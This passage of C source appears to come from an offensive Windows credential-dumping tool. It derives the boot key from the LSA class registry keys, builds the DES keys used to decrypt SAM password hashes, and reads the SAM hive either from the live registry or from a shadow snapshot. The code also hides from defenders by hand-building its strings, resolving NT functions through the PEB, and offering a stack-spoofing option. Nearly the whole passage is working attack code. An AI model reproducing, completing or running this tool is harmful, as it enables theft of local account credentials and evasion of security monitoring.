0x89, 0x89, 0x8a, 0x8a, 0x8c, 0x8c, 0x8f, 0x8f, 0x91, 0x91, 0x92, 0x92, 0x94, 0x94, 0x97, 0x97, 0x98, 0x98, 0x9b, 0x9b, 0x9d, 0x9d, 0x9e, 0x9e, 0xa1, 0xa1, 0xa2, 0xa2, 0xa4, 0xa4, 0xa7, 0xa7, 0xa8, 0xa8, 0xab, 0xab, 0xad, 0xad, 0xae, 0xae, 0xb0, 0xb0, 0xb3, 0xb3, 0xb5, 0xb5, 0xb6, 0xb6, 0xb9, 0xb9, 0xba, 0xba, 0xbc, 0xbc, 0xbf, 0xbf, 0xc1, 0xc1, 0xc2, 0xc2, 0xc4, 0xc4, 0xc7, 0xc7, 0xc8, 0xc8, 0xcb, 0xcb, 0xcd, 0xcd, 0xce, 0xce, 0xd0, 0xd0, 0xd3, 0xd3, 0xd5, 0xd5, 0xd6, 0xd6, 0xd9, 0xd9, 0xda, 0xda, 0xdc, 0xdc, 0xdf, 0xdf, 0xe0, 0xe0, 0xe3, 0xe3, 0xe5, 0xe5, 0xe6, 0xe6, 0xe9, 0xe9, 0xea, 0xea, 0xec, 0xec, 0xef, 0xef, 0xf1, 0xf1, 0xf2, 0xf2, 0xf4, 0xf4, 0xf7, 0xf7, 0xf8, 0xf8, 0xfb, 0xfb, 0xfd, 0xfd, 0xfe, 0xfe };

	BYTE key[8] = {};

	key[0] = s[0] >> 1;
	key[1] = ((s[0] & 0x1) << 6) | (s[1] >> 2);
	key[2] = ((s[1] & 0x3) << 5) | (s[2] >> 3);
	key[3] = ((s[2] & 0x7) << 4) | (s[3] >> 4);
	key[4] = ((s[3] & 0xf) << 3) | (s[4] >> 5);
	key[5] = ((s[4] & 0x1f) << 2) | (s[5] >> 6);
	key[6] = ((s[5] & 0x3f) << 1) | (s[6] >> 7);
	key[7] = s[6] & 0x7f;

	key[0] = oddParity[(key[0] << 1)];
	key[1] = oddParity[(key[1] << 1)];
	key[2] = oddParity[(key[2] << 1)];
	key[3] = oddParity[(key[3] << 1)];
	key[4] = oddParity[(key[4] << 1)];
	key[5] = oddParity[(key[5] << 1)];
	key[6] = oddParity[(key[6] << 1)];
	key[7] = oddParity[(key[7] << 1)];

	CopyMemory(keyRet, key, 8);

	return;
}

void getClasses(PSAM samRegEntry) {
	WCHAR sJD[] = { L'J',L'D', L'\0' };
	WCHAR sSkew1[] = { L'S',L'k',L'e',L'w',L'1', L'\0' };
	WCHAR sGBG[] = { L'G',L'B',L'G', L'\0' };
	WCHAR sData[] = { L'D',L'a',L't',L'a', L'\0' };

	PWCHAR sAll[4] = { sJD, sSkew1, sGBG, sData };

	WCHAR Reg[] = { L'\\',L'R',L'e',L'g',L'i',L's',L't',L'r',L'y',L'\\',L'M',L'a',L'c',L'h',L'i',L'n',L'e',L'\\',L'S',L'Y',L'S',L'T',L'E',L'M',L'\\',L'C',L'u',L'r',L'r',L'e',L'n',L't',L'C',L'o',L'n',L't',L'r',L'o',L'l',L'S',L'e',L't',L'\\',L'C',L'o',L'n',L't',L'r',L'o',L'l',L'\\',L'L',L's',L'a',L'\\', L'\0' };

	WCHAR resul[MAX_KEY_VALUE_LENGTH] = L"\0";

	HANDLE key;
	OBJECT_ATTRIBUTES attributes;
	UNICODE_STRING UnicodeRegPath;
	PKEY_FULL_INFORMATION keyInfo;
	DWORD lengthBuff;

	DWORD ret;

	DebugPrintf("Collecting SYSTEM LSA class strings from live registry\n");

	for (int i = 0; i < 4; i++) {
		WCHAR RegAux[MAX_PATH] = L"\0";

		wcscpy_s(RegAux, MAX_PATH, Reg);
		wcsncat_s(RegAux, MAX_PATH, sAll[i], _TRUNCATE);
		DebugPrintWideString("Opening SYSTEM LSA class key", RegAux);

		pMyRtlInitUnicodeString(&UnicodeRegPath, RegAux);
		InitializeObjectAttributes(&attributes, &UnicodeRegPath, OBJ_CASE_INSENSITIVE, NULL, NULL);

		ret = pMyNtOpenKey(&key, KEY_READ, &attributes);
		DebugPrintf("NtOpenKey(SYSTEM LSA class key) returned 0x%08lX\n", ret);

		if (!NT_SUCCESS(ret)) {
			exit(ret);
		}

		ret = pMyNtQueryKey(key, KeyFullInformation, NULL, 0, &lengthBuff);
		DebugPrintf("NtQueryKey(SYSTEM LSA class size probe) returned 0x%08lX; required bytes: %lu\n", ret, lengthBuff);

		keyInfo = (PKEY_FULL_INFORMATION)HeapAlloc(GetProcessHeap(), 0, lengthBuff);

		ret = pMyNtQueryKey(key, KeyFullInformation, keyInfo, lengthBuff, &lengthBuff);
		DebugPrintf("NtQueryKey(SYSTEM LSA class full information) returned 0x%08lX\n", ret);

		if (!NT_SUCCESS(ret)) {
			exit(ret);
		}

		DebugPrintf("SYSTEM LSA class bytes: %lu\n", keyInfo->ClassLength);

		PWCHAR data = (PWCHAR)((ULONG_PTR)keyInfo + keyInfo->ClassOffset);

		PWCHAR aux = (PWCHAR)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, keyInfo->ClassLength + sizeof(WCHAR));

		CopyMemory(aux, data, keyInfo->ClassLength);
		DebugPrintWideLength("SYSTEM LSA class chunk", aux, keyInfo->ClassLength / sizeof(WCHAR));
		wcsncat_s(resul, MAX_KEY_VALUE_LENGTH, aux, _TRUNCATE);
		DebugPrintWideString("Accumulated SYSTEM LSA class material", resul);

		HeapFree(GetProcessHeap(), 0, keyInfo);
		HeapFree(GetProcessHeap(), 0, aux);

		pMyNtClose(key);
	}
	wcscpy_s(samRegEntry->classes, MAX_KEY_VALUE_LENGTH, resul);
	DebugPrintWideString("Final SYSTEM LSA class material", samRegEntry->classes);

	return;
}

void getBootKey(PSAM samRegEntry, PBYTE bootKeyRet) {
	LONG magics[16] = { 8,5,4,2,11,9,13,3,0,6,1,12,14,10,15,7 };
	BYTE bootKey[16] = {};
	DebugPrintWideString("Bootkey source class material", samRegEntry->classes);
	DebugPrintf("Bootkey class-byte permutation: 8,5,4,2,11,9,13,3,0,6,1,12,14,10,15,7\n");
	for (int i = 0; i < 16; i++) {
		CHAR auxStr[3] = {};

		PCHAR end;

		auxStr[0] = samRegEntry->classes[magics[i] * 2];
		auxStr[1] = samRegEntry->classes[magics[i] * 2 + 1];

		bootKey[i] = strtoul(auxStr, &end, 16);
	}
	CopyMemory(bootKeyRet, bootKey, 16);
	DebugPrintHex("Bootkey helper output", bootKeyRet, 16);
}

void getDESStr1(PSAM samRegEntry, PBYTE desStr1Ret) {
	LONG magics[7] = { 3,2,1,0,3,2,1 };
	BYTE desStr1[7] = {};
	for (int i = 0; i < 7; i++) {
		CHAR auxStr[3] = {};

		PCHAR end;

		auxStr[0] = samRegEntry->rid[magics[i] * 2];
		auxStr[1] = samRegEntry->rid[magics[i] * 2 + 1];

		desStr1[i] = strtoul(auxStr, &end, 16);
	}
	CopyMemory(desStr1Ret, desStr1, 7);
}

void getDESStr2(PSAM samRegEntry, PBYTE desStr2Ret) {
	LONG magics[7] = { 0,3,2,1,0,3,2 };
	BYTE desStr2[7] = {};
	for (int i = 0; i < 7; i++) {
		CHAR auxStr[3] = {};

		PCHAR end;

		auxStr[0] = samRegEntry->rid[magics[i] * 2];
		auxStr[1] = samRegEntry->rid[magics[i] * 2 + 1];

		desStr2[i] = strtoul(auxStr, &end, 16);
	}
	CopyMemory(desStr2Ret, desStr2, 7);
}

void getAuxSyskey(PSAM samRegEntry, PBYTE auxSyskeyRet) {
	LONG magics[4] = { 3,2,1,0 };
	BYTE auxSyskey[4] = {};
	for (int i = 0; i < 4; i++) {
		CHAR auxStr[3] = {};

		PCHAR end;

		auxStr[0] = samRegEntry->rid[magics[i] * 2];
		auxStr[1] = samRegEntry->rid[magics[i] * 2 + 1];

		auxSyskey[i] = strtoul(auxStr, &end, 16);
	}
	CopyMemory(auxSyskeyRet, auxSyskey, 4);
}

void toUpperStr(char* s) {
	for (int i = 0; i < strlen(s); i++) {
		s[i] = toupper(s[i]);
	}
}

DWORD HashString2A(LPCSTR String)
{
	ULONG Hash = 6485;
	INT c = 0;

	while (c = *String++)
		Hash = ((Hash << 5) + Hash) + c;

	return Hash;
}

int main(int argc, char** argv) {
	BOOL useShadowSnapshotFlag = FALSE;
	BOOL useRegistryFlag = FALSE;
	BOOL debugFlag = FALSE;
	BOOL proxyNTCallsFlag = FALSE;

	CHAR helpOptionShort[] = "-h";
	CHAR helpOptionLong[] = "--help";
	CHAR ssOptionShort[] = "-ss";
	CHAR ssOptionLong[] = "--shadowSnapshot";
	CHAR registryOptionShort[] = "-r";
	CHAR registryOptionLong[] = "--registry";
	CHAR debugOptionShort[] = "-d";
	CHAR debugOptionLong[] = "--debug";
	CHAR stackSpoofOptionShort[] = "-cc";
	CHAR stackSpoofOptionLong[] = "--customCallback";

	if (argc == 1) {
		printf("Usage: %s [options]\n", argv[0]);
		printf("Options:\n");
		printf("  %s, %s  Show this help message\n", helpOptionShort, helpOptionLong);
		printf("  %s, %s\tUse shadow snapshot method\n", ssOptionShort, ssOptionLong);
		printf("  %s, %s\t\tUse registry method\n", registryOptionShort, registryOptionLong);
		printf("  %s, %s\t\tEnable debug mode\n", debugOptionShort, debugOptionLong);
		printf("  %s, %s\tUse custom callback mechanism (Stack Spoofing)\n", stackSpoofOptionShort, stackSpoofOptionLong);
	}

	for (int i = 1; i < argc; i++) {
		PCHAR currentArg = argv[i];

		if (strncmp(currentArg, helpOptionShort, strlen(helpOptionShort)) == 0 || strncmp(currentArg, helpOptionLong, strlen(helpOptionLong)) == 0) {
			printf("Usage: %s [options]\n", argv[0]);
			printf("Options:\n");
			printf("  %s, %s  Show this help message\n", helpOptionShort, helpOptionLong);
			printf("  %s, %s\tUse shadow snapshot method\n", ssOptionShort, ssOptionLong);
			printf("  %s, %s\t\tUse registry method\n", registryOptionShort, registryOptionLong);
			printf("  %s, %s\t\tEnable debug mode\n", debugOptionShort, debugOptionLong);
			printf("  %s, %s\tUse custom callback mechanism (Stack Spoofing)\n", stackSpoofOptionShort, stackSpoofOptionLong);
		}
		else if (strncmp(currentArg, ssOptionShort, strlen(ssOptionShort)) == 0 || strncmp(currentArg, ssOptionLong, strlen(ssOptionLong)) == 0) {
			useShadowSnapshotFlag = TRUE;
		}
		else if (strncmp(currentArg, registryOptionShort, strlen(registryOptionShort)) == 0 || strncmp(currentArg, registryOptionLong, strlen(registryOptionLong)) == 0) {
			useRegistryFlag = TRUE;
		}
		else if (strncmp(currentArg, debugOptionShort, strlen(debugOptionShort)) == 0 || strncmp(currentArg, debugOptionLong, strlen(debugOptionLong)) == 0) {
			debugFlag = TRUE;
		}
		else if (strncmp(currentArg, stackSpoofOptionShort, strlen(stackSpoofOptionShort)) == 0 || strncmp(currentArg, stackSpoofOptionLong, strlen(stackSpoofOptionLong)) == 0) {
			proxyNTCallsFlag = TRUE;
		}
	}

	gDebugEnabled = debugFlag;
	DebugPrintf("Debug mode enabled\n");
	DebugPrintf("Parsed options: registry=%s, shadowSnapshot=%s, customCallback=%s\n",
		useRegistryFlag ? "true" : "false",
		useShadowSnapshotFlag ? "true" : "false",
		proxyNTCallsFlag ? "true" : "false");

	if (proxyNTCallsFlag) {
		DebugPrintf("Using custom callback proxy functions for NT calls\n");
		pMyNtOpenKey = proxyNtOpenKey;
		pMyNtQueryKey = proxyNtQueryKey;
		pMyNtEnumerateKey = proxyNtEnumerateKey;
		pMyNtQueryValueKey = proxyNtQueryValueKey;
		pMyNtEnumerateValueKey = proxyNtEnumerateValueKey;
		pMyNtClose = proxyNtCloseKey;
		pMyRtlInitUnicodeString = proxyRtlInitUnicodeString;
	}
	else {
		DebugPrintf("Resolving NT functions by walking PEB export tables\n");
		FARPROC auxPMyNtOpenKey = myGetProcAddress(ntdlldll_RFDT, NtOpenKey_RFDT);
		FARPROC auxPMyNtQueryKey = myGetProcAddress(ntdlldll_RFDT, NtQueryKey_RFDT);
		FARPROC auxPMyNtEnumerateKey = myGetProcAddress(ntdlldll_RFDT, NtEnumerateKey_RFDT);
		FARPROC auxPMyNtQueryValueKey = myGetProcAddress(ntdlldll_RFDT, NtQueryValueKey_RFDT);
		FARPROC auxPMyNtEnumerateValueKey = myGetProcAddress(ntdlldll_RFDT, NtEnumerateValueKey_RFDT);
		FARPROC auxPMyNtClose = myGetProcAddress(ntdlldll_RFDT, NtClose_RFDT);
		FARPROC auxPMyRtlInitUnicodeString = myGetProcAddress(ntdlldll_RFDT, RtlInitUnicodeString_RFDT);

		pMyNtOpenKey = (myNtOpenKey)auxPMyNtOpenKey;
		pMyNtQueryKey = (myNtQueryKey)auxPMyNtQueryKey;
		pMyNtEnumerateKey = (myNtEnumerateKey)auxPMyNtEnumerateKey;
		pMyNtQueryValueKey = (myNtQueryValueKey)auxPMyNtQueryValueKey;
		pMyNtEnumerateValueKey = (myNtEnumerateValueKey)auxPMyNtEnumerateValueKey;
		pMyNtClose = myNtClose(auxPMyNtClose);
		pMyRtlInitUnicodeString = (myRtlInitUnicodeString)auxPMyRtlInitUnicodeString;
	}

	DebugPrintf("NtOpenKey pointer: %p\n", (PVOID)pMyNtOpenKey);
	DebugPrintf("NtQueryKey pointer: %p\n", (PVOID)pMyNtQueryKey);
	DebugPrintf("NtEnumerateKey pointer: %p\n", (PVOID)pMyNtEnumerateKey);
	DebugPrintf("NtQueryValueKey pointer: %p\n", (PVOID)pMyNtQueryValueKey);
	DebugPrintf("NtEnumerateValueKey pointer: %p\n", (PVOID)pMyNtEnumerateValueKey);
	DebugPrintf("NtClose pointer: %p\n", (PVOID)pMyNtClose);
	DebugPrintf("RtlInitUnicodeString pointer: %p\n", (PVOID)pMyRtlInitUnicodeString);


	if (useRegistryFlag) {
		DebugPrintf("Running live registry SAM extraction method\n");
		ULONG size;
		PSAM sam[MAX_SAM_ENTRIES] = {};

		getSAM(NULL, &size);
		DebugPrintf("Live registry size probe returned %lu bytes (%lu entries)\n", size, size / sizeof(SAM));

		getSAM(sam, &size);
		DebugPrintf("Live registry collection returned %lu bytes (%lu entries)\n", size, size / sizeof(SAM));

		decryptSAM(sam, size / sizeof(SAM));
	}

	if (useShadowSnapshotFlag) {
		DebugPrintf("Running shadow snapshot SAM extraction method\n");
		ULONG size;
		PSAM sam[MAX_SAM_ENTRIES] = {};

		WCHAR sourcePathFileSAM[MAX_PATH * sizeof(WCHAR)];
		WCHAR sourcePathFileSYSTEM[MAX_PATH * sizeof(WCHAR)];
		if (!createSS(sourcePathFileSAM, sourcePathFileSYSTEM)) {
			printf("Unable to create shadow snapshot\n");
			exit(1);
		}
		DebugPrintWideString("Shadow snapshot SAM path", sourcePathFileSAM);
		DebugPrintWideString("Shadow snapshot SYSTEM path", sourcePathFileSYSTEM);

		getSAMfromRegf(NULL, &size, sourcePathFileSAM, sourcePathFileSYSTEM);
		DebugPrintf("Offline hive size probe returned %lu bytes (%lu entries)\n", size, size / sizeof(SAM));
		getSAMfromRegf(sam, &size, sourcePathFileSAM, sourcePathFileSYSTEM);
		DebugPrintf("Offline hive collection returned %lu bytes (%lu entries)\n", size, size / sizeof(SAM));

		decryptSAM(sam, size / sizeof(SAM));
	}
}
